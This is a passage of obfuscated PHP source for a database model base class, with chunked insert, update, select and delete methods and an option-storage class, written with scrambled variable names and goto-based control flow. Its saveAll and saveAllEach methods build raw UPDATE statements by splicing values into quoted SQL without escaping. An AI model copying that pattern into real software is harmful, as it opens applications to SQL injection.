$B’½äõÅ¾ <= 1 ? 1 : ($B’½äõÅ¾ >= $A’ÁÙĞàŸ„ ? $A’ÁÙĞàŸ„ : $B’½äõÅ¾); goto bê¤¯ª£½; c•­•·¿äŠ: if ($A’ÁÙĞàŸ„ == 1) { $B´äæˆáˆÕ = count($FŞ‘Ô””À·); } $f’óÉßÙ«ƒ = array($D†‚Í²ùô[351] => array($D†‚Í²ùô[352] => $B´äæˆáˆÕ, $D†‚Í²ùô[349] => $DƒÜ‘Ş‚ø†, $D†‚Í²ùô[340] => $B’½äõÅ¾, $D†‚Í²ùô[353] => $A’ÁÙĞàŸ„), $D†‚Í²ùô[354] => $FŞ‘Ô””À· ? $FŞ‘Ô””À· : array()); return $f’óÉßÙ«ƒ; goto e•œ‰¦®‚¯; C›†ÇïØÄÓ: $D†‚Í²ùô =& $_SERVER[´Ù×Íå‘ÄõÛ]; global $in; $FµğÁ‹Ç¿¹ = $this->optionsValue(); goto aïìØœÓ; EàçãÍÂ: $B´äæˆáˆÕ = intval($this->count()); $DƒÜ‘Ş‚ø† = intval($DƒÜ‘Ş‚ø†); $DƒÜ‘Ş‚ø† = $DƒÜ‘Ş‚ø† <= 5 ? 5 : ($DƒÜ‘Ş‚ø† >= $dÅÎĞÄ–ƒ ? $dÅÎĞÄ–ƒ : $DƒÜ‘Ş‚ø†); goto E‡­éĞô±¹; e•œ‰¦®‚¯: } protected function checkLength($Dˆİö‡Áì, $a²×‹Ü¾È = 0, $Eó¹ï”˜Æ = '') { $F²«Ö¿øÅÙ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a²×‹Ü¾È = $a²×‹Ü¾È ? $a²×‹Ü¾È : 65536; if (!$Dˆİö‡Áì || strlen($Dˆİö‡Áì) < $a²×‹Ü¾È) { return; } $Eó¹ï”˜Æ = $Eó¹ï”˜Æ ? $Eó¹ï”˜Æ . $F²«Ö¿øÅÙ[67] : $F²«Ö¿øÅÙ[33]; show_json($Eó¹ï”˜Æ . LNG($F²«Ö¿øÅÙ[355]) . "\50{$a²×‹Ü¾È}\x29", !1); } protected function metaSet($EÉˆóß‘Ü¥, $DË’£ÓÎ¶ = null, $F¦‡³ç‡äÌ = null) { goto Aˆ…Ÿ†šÑ; AÃØáôˆöÕ: $C×Ê»åÎÑ¥->where(array($CÂõÇÕ¥Øù => $EÉˆóß‘Ü¥))->addAll($aŒÍ¢‡¯‰¿, array(), !0); return !0; goto B¦Æğ÷…ÕÆ; dÔÜ—…›ƒÏ: if (is_null($DË’£ÓÎ¶)) { return $C×Ê»åÎÑ¥->where(array($CÂõÇÕ¥Øù => $EÉˆóß‘Ü¥))->delete(); } if (is_null($F¦‡³ç‡äÌ) && is_string($DË’£ÓÎ¶)) { return $C×Ê»åÎÑ¥->where($f³¬èÎº¹Ê)->delete(); } $fŠŒ‡éø÷ = is_array($DË’£ÓÎ¶) ? $DË’£ÓÎ¶ : array(); goto DôÔİ´ë•; D·‘éßÉ£ğ: $f÷òÂÒƒİ© = $this->tableMeta[$eãĞ¸ªÒÙÓ[357]]; $C×Ê»åÎÑ¥ = Model($f÷òÂÒƒİ©); $f³¬èÎº¹Ê = array($CÂõÇÕ¥Øù => $EÉˆóß‘Ü¥, $eãĞ¸ªÒÙÓ[358] => $DË’£ÓÎ¶); goto dÔÜ—…›ƒÏ; Aˆ…Ÿ†šÑ: $eãĞ¸ªÒÙÓ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->tableMeta) { return !1; } $CÂõÇÕ¥Øù = $this->tableMeta[$eãĞ¸ªÒÙÓ[356]]; goto D·‘éßÉ£ğ; DôÔİ´ë•: if (is_string($DË’£ÓÎ¶)) { $fŠŒ‡éø÷[$DË’£ÓÎ¶] = $F¦‡³ç‡äÌ; } $aŒÍ¢‡¯‰¿ = array(); foreach ($fŠŒ‡éø÷ as $eïçÏÅ¯­¯ => $Eğ»†ÄÊŠ‰) { $this->checkLength($Eğ»†ÄÊŠ‰, !1, $f÷òÂÒƒİ© . $eãĞ¸ªÒÙÓ[4] . $eïçÏÅ¯­¯); $aŒÍ¢‡¯‰¿[] = array($CÂõÇÕ¥Øù => $EÉˆóß‘Ü¥, $eãĞ¸ªÒÙÓ[89] => $eïçÏÅ¯­¯, $eãĞ¸ªÒÙÓ[359] => $Eğ»†ÄÊŠ‰); } goto AÃØáôˆöÕ; B¦Æğ÷…ÕÆ: } public function metaGet($a¤¼‹­Âè², $AÆœ´ÚƒÒø = false) { goto eßâÁõíø¸; f¯–Í©§±ª: $cÈ÷ß«ÛªŒ = $EŠÌÆ¼½†³->field($a¢…ÇÄ„‹[360])->where($C±™ìƒƒŠé)->select(); $cÈ÷ß«ÛªŒ = array_to_keyvalue($cÈ÷ß«ÛªŒ, $a¢…ÇÄ„‹[89], $a¢…ÇÄ„‹[359]); return $cÈ÷ß«ÛªŒ; goto dº÷Û‡ˆ¹Š; eßâÁõíø¸: $a¢…ÇÄ„‹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->tableMeta) { return array(); } $DÅ³…òçÌÓ = $this->tableMeta[$a¢…ÇÄ„‹[356]]; goto A¡ˆÇÂ…ö; A¡ˆÇÂ…ö: $EŠÌÆ¼½†³ = Model($this->tableMeta[$a¢…ÇÄ„‹[357]]); if ($AÆœ´ÚƒÒø) { $C±™ìƒƒŠé = array($DÅ³…òçÌÓ => $a¤¼‹­Âè², $a¢…ÇÄ„‹[89] => $AÆœ´ÚƒÒø); return $EŠÌÆ¼½†³->where($C±™ìƒƒŠé)->getField($a¢…ÇÄ„‹[359]); } $C±™ìƒƒŠé = array($DÅ³…òçÌÓ => $a¤¼‹­Âè²); goto f¯–Í©§±ª; dº÷Û‡ˆ¹Š: } private function checkDataAutoHas($E¬Ö«‰®•) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $e¨¹±Ç÷¹) { if (in_array($E¬Ö«‰®•, explode($_SERVER[´Ù×Íå‘ÄõÛ][47], $e¨¹±Ç÷¹[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$CÌÚ½Í›ªš, $BŒğŒ¦¸ÉÙ) { $Bëâ‰…˜‹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; foreach ($this->dataAuto as $Aä˜ïïÇä) { $c‹ÏÉÔ = $Aä˜ïïÇä[0]; if (!in_array($BŒğŒ¦¸ÉÙ, explode($Bëâ‰…˜‹[47], $Aä˜ïïÇä[2]))) { continue; } switch (trim($Aä˜ïïÇä[3])) { case $Bëâ‰…˜‹[309]: case $Bëâ‰…˜‹[310]: $Aï…îÖœ…… = $Aä˜ïïÇä[1]; $E”™•ê¾µƒ = isset($Aä˜ïïÇä[4]) ? (array) $Aä˜ïïÇä[4] : array(); if ($Aï…îÖœ…… == $Bëâ‰…˜‹[190] && array_key_exists($c‹ÏÉÔ, $CÌÚ½Í›ªš)) { if (!$CÌÚ½Í›ªš[$c‹ÏÉÔ]) { unset($CÌÚ½Í›ªš[$c‹ÏÉÔ]); } break; } if (isset($CÌÚ½Í›ªš[$c‹ÏÉÔ])) { array_unshift($E”™•ê¾µƒ, $CÌÚ½Í›ªš[$c‹ÏÉÔ]); } if ($Bëâ‰…˜‹[309] == $Aä˜ïïÇä[3]) { $CÌÚ½Í›ªš[$c‹ÏÉÔ] = call_user_func_array($Aï…îÖœ……, $E”™•ê¾µƒ); } else { $CÌÚ½Í›ªš[$c‹ÏÉÔ] = call_user_func_array(array(&$this, $Aï…îÖœ……), $E”™•ê¾µƒ); } break; case $Bëâ‰…˜‹[261]: $CÌÚ½Í›ªš[$c‹ÏÉÔ] = $CÌÚ½Í›ªš[$Aä˜ïïÇä[1]]; break; case $Bëâ‰…˜‹[282]: if (isset($CÌÚ½Í›ªš[$c‹ÏÉÔ]) && !is_string($CÌÚ½Í›ªš[$c‹ÏÉÔ])) { $CÌÚ½Í›ªš[$c‹ÏÉÔ] = json_encode_force($CÌÚ½Í›ªš[$c‹ÏÉÔ]); } break; case $Bëâ‰…˜‹[311]: if ($CÌÚ½Í›ªš[$c‹ÏÉÔ] === $Bëâ‰…˜‹[33]) { unset($CÌÚ½Í›ªš[$c‹ÏÉÔ]); } break; case $Bëâ‰…˜‹[312]: $CÌÚ½Í›ªš[$c‹ÏÉÔ] = $Aä˜ïïÇä[1]; default: break; } } if ($BŒğŒ¦¸ÉÙ == $Bëâ‰…˜‹[344]) { $F±•Ş¬É¢£ = strtolower($this->db->getDbType()); if (strpos($F±•Ş¬É¢£, $Bëâ‰…˜‹[9]) !== 0) { return; } $aÁôª”â = $this->field(!0)->fields; $dŠ¹‹†ÜŠ = $aÁôª”â[$Bëâ‰…˜‹[240]]; if (isset($aÁôª”â[$Bëâ‰…˜‹[239]])) { unset($dŠ¹‹†ÜŠ[$aÁôª”â[$Bëâ‰…˜‹[239]]]); } foreach ($dŠ¹‹†ÜŠ as $dáê Äš¦‘ => $BŒğŒ¦¸ÉÙ) { if (!isset($CÌÚ½Í›ªš[$dáê Äš¦‘])) { $CÌÚ½Í›ªš[$dáê Äš¦‘] = $Bëâ‰…˜‹[33]; } } } } private function dataAfterFilter(&$C×±Ğ·àÎ) { $DãÛ£Çª =& $_SERVER[´Ù×Íå‘ÄõÛ]; foreach ($this->dataAuto as $cÖ¶ç›ÄÁâ) { $fâ‰•Ã„¿¶ = $cÖ¶ç›ÄÁâ[0]; if (!in_array($DãÛ£Çª[346], explode($DãÛ£Çª[47], $cÖ¶ç›ÄÁâ[2]))) { continue; } if (!isset($C×±Ğ·àÎ[$fâ‰•Ã„¿¶])) { continue; } switch (trim($cÖ¶ç›ÄÁâ[3])) { case $DãÛ£Çª[309]: case $DãÛ£Çª[310]: $E‘Á¦£™‹Ô = isset($cÖ¶ç›ÄÁâ[4]) ? (array) $cÖ¶ç›ÄÁâ[4] : array(); array_unshift($E‘Á¦£™‹Ô, $C×±Ğ·àÎ[$fâ‰•Ã„¿¶]); if ($DãÛ£Çª[309] == $cÖ¶ç›ÄÁâ[3]) { $C×±Ğ·àÎ[$fâ‰•Ã„¿¶] = call_user_func_array($cÖ¶ç›ÄÁâ[1], $E‘Á¦£™‹Ô); } else { $C×±Ğ·àÎ[$fâ‰•Ã„¿¶] = call_user_func_array(array(&$this, $cÖ¶ç›ÄÁâ[1]), $E‘Á¦£™‹Ô); } break; case $DãÛ£Çª[261]: $C×±Ğ·àÎ[$fâ‰•Ã„¿¶] = $C×±Ğ·àÎ[$cÖ¶ç›ÄÁâ[1]]; break; case $DãÛ£Çª[282]: $CÍêØÔğôÀ = $C×±Ğ·àÎ[$fâ‰•Ã„¿¶]; $C×±Ğ·àÎ[$fâ‰•Ã„¿¶] = json_decode($CÍêØÔğôÀ, !0); if (is_null($C×±Ğ·àÎ[$fâ‰•Ã„¿¶])) { $C×±Ğ·àÎ[$fâ‰•Ã„¿¶] = $CÍêØÔğôÀ; } break; case $DãÛ£Çª[311]: if ($C×±Ğ·àÎ[$fâ‰•Ã„¿¶] === $DãÛ£Çª[33]) { unset($C×±Ğ·àÎ[$fâ‰•Ã„¿¶]); } break; case $DãÛ£Çª[312]: $C×±Ğ·àÎ[$fâ‰•Ã„¿¶] = $cÖ¶ç›ÄÁâ[1]; default: break; } } } public function saveAll($AÈ¬œÑÁ•Ñ) { goto AäâÜç—Ó; AäâÜç—Ó: $aÃ–º—›¥‡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F²±œ§Ü† = $this->tablePrefix . $this->tableName; $cÅÁĞæ¢  = self::SQL_WHERE_IN_CHUNK; goto Få¦Éî‡ß»; AÀ°…•ƒÜæ: $D«ªà®†‡£ = array(); $CÙ©î¬Úˆ = count($AÈ¬œÑÁ•Ñ); for ($b•Ïê×–‚ = 0; $b•Ïê×–‚ < $CÙ©î¬Úˆ; $b•Ïê×–‚++) { $b¶ÛÎªŒù¤ = $AÈ¬œÑÁ•Ñ[$b•Ïê×–‚]; if (!is_array($b¶ÛÎªŒù¤) || count($b¶ÛÎªŒù¤) != 4) { continue; } $Aù¿Ö›š‘¡ = "\125\x50\104\x41\x54\x45\40\140{$F²±œ§Ü†}\140\40\x53\x45\x54\40{$b¶ÛÎªŒù¤[2]}\x20\75\40\103\101\x53\105\40{$b¶ÛÎªŒù¤[0]}\40\12"; if ($A†°³§Îïó == 0) { $E¢áŒ«¶šª = $Aù¿Ö›š‘¡; } $D«ªà®†‡£[] = $aÃ–º—›¥‡[113] . $b¶ÛÎªŒù¤[1] . $aÃ–º—›¥‡[113]; $A†°³§Îïó++; $E¢áŒ«¶šª .= "\40\x57\x48\x45\116\x20\47{$b¶ÛÎªŒù¤[1]}\x27\40\124\x48\105\116\x20\x27{$b¶ÛÎªŒù¤[3]}\x27\40\12"; if ($A†°³§Îïó == $cÅÁĞæ¢  || $b•Ïê×–‚ == $CÙ©î¬Úˆ - 1) { goto cï÷ êˆåÈ; cï÷ êˆåÈ: $bğéˆ¥š´Ä = implode($aÃ–º—›¥‡[47], $D«ªà®†‡£); $E¢áŒ«¶šª .= "\40\x45\116\104\x20\x20\x57\110\105\122\105\x20{$b¶ÛÎªŒù¤[0]}\40\111\116\x20\50{$bğéˆ¥š´Ä}\51\x20"; $this->execute($E¢áŒ«¶šª); goto c‡‰æò¢; c‡‰æò¢: $A†°³§Îïó = 0; $E¢áŒ«¶šª = $Aù¿Ö›š‘¡; $this->chunkEventCheck(count($D«ªà®†‡£)); goto Bˆê”†˜Œ›; Bˆê”†˜Œ›: $D«ªà®†‡£ = array(); goto f…‚’öíğ; f…‚’öíğ: } } goto b´œœÖÑ‘ï; Få¦Éî‡ß»: $AÈ¬œÑÁ•Ñ = is_array($AÈ¬œÑÁ•Ñ) ? $AÈ¬œÑÁ•Ñ : array(); $E¢áŒ«¶šª = $aÃ–º—›¥‡[361]; $A†°³§Îïó = 0; goto AÀ°…•ƒÜæ; b´œœÖÑ‘ï: $this->chunkEventSet(); goto Eˆ—‰Ò‡–ö; Eˆ—‰Ò‡–ö: } public function saveAllEach($F©©‡“Ç) { $C‚Ë’ïß” =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E‰â ¡¡”¿ = $this->tablePrefix . $this->tableName; foreach ($F©©‡“Ç as $B³¥¹·İµÖ) { if (!is_array($B³¥¹·İµÖ) || count($B³¥¹·İµÖ) != 4) { continue; } $dĞíˆÕÑ”æ = $B³¥¹·İµÖ[0] . $C‚Ë’ïß”[362] . $B³¥¹·İµÖ[1] . $C‚Ë’ïß”[113]; $FôŒÅãø‹ = $B³¥¹·İµÖ[2] . $C‚Ë’ïß”[362] . $B³¥¹·İµÖ[3] . $C‚Ë’ïß”[113]; $d‚…Ó§õŒ = "\x75\x70\x64\x61\x74\x65\40{$E‰â ¡¡”¿}\x20\x73\x65\x74\x20{$FôŒÅãø‹}\40\x77\x68\x65\162\145\x20{$dĞíˆÕÑ”æ}\x3b"; $this->execute($d‚…Ó§õŒ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($B„¹Ã§¯Š‚ = false, $BÄÒëÇ¯Ì = false) { $this->_chunkEvent = $B„¹Ã§¯Š‚; $this->_chunkEventParam = $BÄÒëÇ¯Ì; } private function chunkEventCheck($BŠ‹Ã”•Í¯) { if (!$this->_chunkEvent) { return; } $DÖñ­ºßÜ¤ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $DÖñ­ºßÜ¤[$_SERVER[´Ù×Íå‘ÄõÛ][363]] = $BŠ‹Ã”•Í¯; Hook::trigger($this->_chunkEvent, $DÖñ­ºßÜ¤); } public function addAll($A¯ó‹Ô°ˆ, $C¨¯–Ìƒ‹¦ = array(), $eíÈÑò¾ = false) { goto EÇÇ¨‘„ĞÑ; Aîæ‹¥ŠÃ†: if (empty($A¯ó‹Ô°ˆ)) { $this->error = think_lang($d××ºá¸íÙ[259]); return !1; } $C¨¯–Ìƒ‹¦ = $this->_parseOptions($C¨¯–Ìƒ‹¦); foreach ($A¯ó‹Ô°ˆ as $EÃ®œ´¤å² => $EìÀÁ‹¦°¢) { $A¯ó‹Ô°ˆ[$EÃ®œ´¤å²] = $this->_facade($EìÀÁ‹¦°¢); $this->_beforeInsert($A¯ó‹Ô°ˆ[$EÃ®œ´¤å²], $C¨¯–Ìƒ‹¦); } goto bô“«å¢–œ; bô“«å¢–œ: if (method_exists($this->db, $d××ºá¸íÙ[260])) { for ($f¥‰¯™õ†¹ = 0; $f¥‰¯™õ†¹ < count($A¯ó‹Ô°ˆ); $f¥‰¯™õ†¹ += $a‰½í±ñòÔ) { $cãÖÎ·Ö = array_slice($A¯ó‹Ô°ˆ, $f¥‰¯™õ†¹, $a‰½í±ñòÔ); if (!is_array($cãÖÎ·Ö) || count($cãÖÎ·Ö) == 0) { break; } $F¿ÊçÖæ‹ì = $this->db->insertAll($cãÖÎ·Ö, $C¨¯–Ìƒ‹¦, $eíÈÑò¾); $this->chunkEventCheck(count($cãÖÎ·Ö)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($A¯ó‹Ô°ˆ as $EÃ®œ´¤å² => $EìÀÁ‹¦°¢) { $F¿ÊçÖæ‹ì = $this->db->insert($EìÀÁ‹¦°¢, $C¨¯–Ìƒ‹¦, $eíÈÑò¾); } $this->commit(); } if (!1 !== $F¿ÊçÖæ‹ì) { $B„‰‡œŒñ = $this->getLastInsID(); if ($B„‰‡œŒñ) { return $B„‰‡œŒñ; } } return $F¿ÊçÖæ‹ì; goto b¬ğÈ; EÇÇ¨‘„ĞÑ: $d××ºá¸íÙ =& $_SERVER[´Ù×Íå‘ÄõÛ]; ignore_timeout(); $a‰½í±ñòÔ = self::SQL_WHERE_IN_CHUNK; goto Aîæ‹¥ŠÃ†; b¬ğÈ: } public function save($E³“ÈÙŸÕ† = '', $E®å¯Èöƒ‘ = array()) { goto cØó¯Ç§·ˆ; bğÀâ½Ê­: $b‘òÛ¸Æñã = $fî«ù¦¶Æ¾[$AêÕÕã »´[263]][$CéØÄ¯†][1]; $b‘òÛ¸Æñã = is_array($b‘òÛ¸Æñã) ? $b‘òÛ¸Æñã : array(); $f”‘•—…ÙÜ = count($b‘òÛ¸Æñã); goto C­‰‹Œ„„Ó; C­‰‹Œ„„Ó: for ($C›¢…ëñ‘— = 0; $C›¢…ëñ‘— < $f”‘•—…ÙÜ; $C›¢…ëñ‘— += $böÊ·óÏİå) { $EÁæ†“çÇ = array_slice($b‘òÛ¸Æñã, $C›¢…ëñ‘—, $böÊ·óÏİå); if (!is_array($EÁæ†“çÇ) || count($EÁæ†“çÇ) == 0) { break; } $fî«ù¦¶Æ¾[$AêÕÕã »´[263]][$CéØÄ¯†][1] = $EÁæ†“çÇ; $this->optionsValue($fî«ù¦¶Æ¾); $c½™Ş°‰¿ += parent::save($E³“ÈÙŸÕ†, $E®å¯Èöƒ‘); $this->chunkEventCheck(count($EÁæ†“çÇ)); } $this->chunkEventSet(); return $c½™Ş°‰¿; goto aìÇ³¡Ø˜Ñ; FÕŸÈ’è÷: $CéØÄ¯† = $this->findWhereField($fî«ù¦¶Æ¾); if (!$CéØÄ¯†) { return parent::save($E³“ÈÙŸÕ†, $E®å¯Èöƒ‘); } $c½™Ş°‰¿ = 0; goto bğÀâ½Ê­; cØó¯Ç§·ˆ: $AêÕÕã »´ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $böÊ·óÏİå = self::SQL_WHERE_IN_CHUNK; $fî«ù¦¶Æ¾ = $this->optionsValue(); goto FÕŸÈ’è÷; aìÇ³¡Ø˜Ñ: } public function add($d©Şí»—ß = '', $EçÈ¢á¹‡ˆ = array(), $déÕåØËò = false) { if ($this->addTaskStatus && is_array($d©Şí»—ß)) { $this->addTaskData[] = $d©Şí»—ß; return; } return parent::add($d©Şí»—ß, $EçÈ¢á¹‡ˆ, $déÕåØËò); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($B‹ÈŸëÄÜæ = array()) { goto fÚç¯¥Ù…‘; FË¯ØÇĞ›: $C«š„™ÎŒ— = is_array($C«š„™ÎŒ—) ? $C«š„™ÎŒ— : array(); $d´ÚÔ¾¾ˆ = null; for ($A´Â¾¥¥Ñ = 0; $A´Â¾¥¥Ñ < count($C«š„™ÎŒ—); $A´Â¾¥¥Ñ += $B˜À——’ô) { $DºØÜ–²‡µ = array_slice($C«š„™ÎŒ—, $A´Â¾¥¥Ñ, $B˜À——’ô); if (!is_array($DºØÜ–²‡µ) || count($DºØÜ–²‡µ) == 0) { break; } $D™¹œÅÉ¹[$A±¶ƒÔ£•[263]][$CŠµšİÚÊœ][1] = $DºØÜ–²‡µ; $this->optionsValue($D™¹œÅÉ¹); $Bíº¬¨•ƒ› = parent::select($B‹ÈŸëÄÜæ); if (!$Bíº¬¨•ƒ›) { continue; } if (is_null($d´ÚÔ¾¾ˆ)) { $d´ÚÔ¾¾ˆ = array(); } $d´ÚÔ¾¾ˆ = array_merge($d´ÚÔ¾¾ˆ, $Bíº¬¨•ƒ›); } goto E¸°Ó×; fÚç¯¥Ù…‘: $A±¶ƒÔ£• =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B˜À——’ô = self::SQL_WHERE_IN_CHUNK; $D™¹œÅÉ¹ = $this->optionsValue(); goto d»ç‹‹ºÂã; d»ç‹‹ºÂã: $CŠµšİÚÊœ = $this->findWhereField($D™¹œÅÉ¹); if (!$CŠµšİÚÊœ || isset($D™¹œÅÉ¹[$A±¶ƒÔ£•[280]]) || isset($D™¹œÅÉ¹[$A±¶ƒÔ£•[340]])) { return parent::select($B‹ÈŸëÄÜæ); } $C«š„™ÎŒ— = $D™¹œÅÉ¹[$A±¶ƒÔ£•[263]][$CŠµšİÚÊœ][1]; goto FË¯ØÇĞ›; E¸°Ó×: return $d´ÚÔ¾¾ˆ; goto D»×ªåƒÜ; D»×ªåƒÜ: } public function delete($aå¾×ÔÆŠ¹ = array()) { goto aŠ™±Ìˆìğ; aŠ™±Ìˆìğ: $eÖ¤²êñæÔ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AÙ¡Óó¢‚‹ = self::SQL_WHERE_IN_CHUNK; $Fé³¾ŠŠ§ = $this->optionsValue(); goto dÅ¥«Ë–±Ã; dÅ¥«Ë–±Ã: $B–Ú„Ó’ = $this->findWhereField($Fé³¾ŠŠ§); if (!$B–Ú„Ó’) { return parent::delete($aå¾×ÔÆŠ¹); } $c —ùİ¨Ğç = 0; goto BãåÄéçĞ; BãåÄéçĞ: $AŒŠÇŸìæ = $Fé³¾ŠŠ§[$eÖ¤²êñæÔ[263]][$B–Ú„Ó’][1]; $AŒŠÇŸìæ = is_array($AŒŠÇŸìæ) ? $AŒŠÇŸìæ : array(); for ($fÊ˜Ğ¬¿×¯ = 0; $fÊ˜Ğ¬¿×¯ < count($AŒŠÇŸìæ); $fÊ˜Ğ¬¿×¯ += $AÙ¡Óó¢‚‹) { $E­¨ïªÒ”¢ = array_slice($AŒŠÇŸìæ, $fÊ˜Ğ¬¿×¯, $AÙ¡Óó¢‚‹); if (!is_array($E­¨ïªÒ”¢) || count($E­¨ïªÒ”¢) == 0) { break; } $Fé³¾ŠŠ§[$eÖ¤²êñæÔ[263]][$B–Ú„Ó’][1] = $E­¨ïªÒ”¢; $this->optionsValue($Fé³¾ŠŠ§); $c —ùİ¨Ğç += parent::delete($aå¾×ÔÆŠ¹); } goto FÓŞÊœ¢ÇĞ; FÓŞÊœ¢ÇĞ: return $c —ùİ¨Ğç; goto a¦ìÊ–ƒÄ; a¦ìÊ–ƒÄ: } private function findWhereField($CŒÖ‘£’Ê†) { $aê·ù‡Ö · =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FÃŞ“¶£ÂÅ = self::SQL_WHERE_IN_CHUNK; if (!is_array($CŒÖ‘£’Ê†) || !is_array($CŒÖ‘£’Ê†[$aê·ù‡Ö ·[263]])) { return !1; } foreach ($CŒÖ‘£’Ê†[$aê·ù‡Ö ·[263]] as $C°“•‰ÕŸ => $BñÖŠ’¼²İ) { if (is_array($BñÖŠ’¼²İ) && isset($BñÖŠ’¼²İ[0]) && is_string($BñÖŠ’¼²İ[0]) && strtolower($BñÖŠ’¼²İ[0]) == $aê·ù‡Ö ·[7] && is_array($BñÖŠ’¼²İ[1]) && count($BñÖŠ’¼²İ[1]) > $FÃŞ“¶£ÂÅ) { ignore_timeout(); return $C°“•‰ÕŸ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\164\145\155\x4f\160\x74\151\157\x6e"; public $field = array(); public function listData($CªÉª”÷‹ = false, $C–Ñ„Ğ‰àÔ = "\x6d\x6f\144\151\146\171\124\151\155\x65", $EçîÚ†òÙİ = false) { $d¼îàäƒê‘ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$d¼îàäƒê‘) { return $CªÉª”÷‹ ? null : array(); } if (!$CªÉª”÷‹) { $d¼îàäƒê‘ = array_filter(array_values($d¼îàäƒê‘)); return array_sort_by($d¼îàäƒê‘, $C–Ñ„Ğ‰àÔ, $EçîÚ†òÙİ); } return $d¼îàäƒê‘[$_SERVER[´Ù×Íå‘ÄõÛ][364] . $CªÉª”÷‹]; } public function insert($e¼Ãç¢‡™) { goto Fõ’à…î; eöº··ŒÜ°: return $D¹¹‰øé; goto dƒ¯‰½é¡í; e”ã·°ŞĞ­: $e¼Ãç¢‡™[$Dí­İÅ¡šä[107]] = time(); Model($this->modelType)->set($Dí­İÅ¡šä[365], $D¹¹‰øé, $this->optionType . $Dí­İÅ¡šä[366]); Model($this->modelType)->set($Dí­İÅ¡šä[364] . $D¹¹‰øé, $e¼Ãç¢‡™, $this->optionType); goto eöº··ŒÜ°; d°¯Ö“‘·: $D¹¹‰øé = $D¹¹‰øé ? $D¹¹‰øé : 0; $e¼Ãç¢‡™[$Dí­İÅ¡šä[367]] = ++$D¹¹‰øé; $e¼Ãç¢‡™[$Dí­İÅ¡šä[187]] = time(); goto e”ã·°ŞĞ­; Fõ’à…î: $Dí­İÅ¡šä =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e¼Ãç¢‡™ = array_field_key($e¼Ãç¢‡™, $this->field); $D¹¹‰øé = Model($this->modelType)->get($Dí­İÅ¡šä[365], $this->optionType . $Dí­İÅ¡šä[366]); goto d°¯Ö“‘·; dƒ¯‰½é¡í: } public function update($d˜Úƒšá˜œ, $D¯œçò¡¢) { goto cÑÔÊÖ®™Ä; cÑÔÊÖ®™Ä: $eà‘™Øğïô =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D¯œçò¡¢ = array_field_key($D¯œçò¡¢, $this->field); $F£“¨À¿Ø‹ = $this->listData($d˜Úƒšá˜œ); goto EÜŸ¶Ñçëƒ; b‰à ó‚×í: return Model($this->modelType)->set($eà‘™Øğïô[364] . $d˜Úƒšá˜œ, $D¯œçò¡¢, $this->optionType); goto Dêö„Â§Ã“; EÜŸ¶Ñçëƒ: if (!$F£“¨À¿Ø‹) { return !1; } $D¯œçò¡¢ = array_merge($F£“¨À¿Ø‹, $D¯œçò¡¢); $D¯œçò¡¢[$eà‘™Øğïô[107]] = time(); goto b‰à ó‚×í; Dêö„Â§Ã“: } public function remove($FÎº›±Ö·ø) { return Model($this->modelType)->remove($_SERVER[´Ù×Íå‘ÄõÛ][364] . $FÎº›±Ö·ø, $this->optionType); } public function clear() { $B²æŠÓ‹Æ =& $_SERVER[´Ù×Íå‘ÄõÛ]; Model($this->modelType)->remove($B²æŠÓ‹Æ[365], $this->optionType . $B²æŠÓ‹Æ[366]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($C†¢º¾ï, $a›çº¥½Éº) { if (!$a›çº¥½Éº) { return !1; } $Eî´´‰Ô‡ = $this->listData(); $Eî´´‰Ô‡ = array_to_keyvalue($Eî´´‰Ô‡, $C†¢º¾ï); return isset($Eî´´‰Ô‡[$a›çº¥½Éº]) ? $Eî´´‰Ô‡[$a›çº¥½Éº] : !1; } public function findByName($CŠ¯¡Ú•») { return $this->findByKey($_SERVER[´Ù×Íå‘ÄõÛ][28], $CŠ¯¡Ú•»); } protected function resetData($c¤…¢ÆÍ‘×) { $bôÑÒî£÷ª =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c¤…¢ÆÍ‘× = is_array($c¤…¢ÆÍ‘×) ? $c¤…¢ÆÍ‘× : array(); $b¥Üç„– = array(); for ($C´Š‘×©à– = 0; $C´Š‘×©à– < count($c¤…¢ÆÍ‘×); $C´Š‘×©à–++) { $b¥Üç„–[$bôÑÒî£÷ª[364] . $c¤…¢ÆÍ‘×[$C´Š‘×©à–][$bôÑÒî£÷ª[367]]] = $c¤…¢ÆÍ‘×[$C´Š‘×©à–]; } return Model($this->modelType)->set($b¥Üç„–, !1, $this->optionType); } private function getAutoName($AõÒÊ¢§Ëá) { $A³„óÌ²ôÖ = array_to_keyvalue($this->listData(), $_SERVER[´Ù×Íå‘ÄõÛ][28]); if (!$A³„óÌ²ôÖ || !isset($A³„óÌ²ôÖ[$AõÒÊ¢§Ëá])) { return $AõÒÊ¢§Ëá; } for ($eÕ»‹ «é¾ = 1; $eÕ»‹ «é¾ < count($A³„óÌ²ôÖ); $eÕ»‹ «é¾++) { $BÉÄÔŠ–‹¢ = $AõÒÊ¢§Ëá . "\x28{$eÕ»‹ «é¾}\51"; if (!isset($A³„óÌ²ôÖ[$BÉÄÔŠ–‹¢])) { return $BÉÄÔŠ–‹¢; } } return $BÉÄÔŠ–‹¢; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; 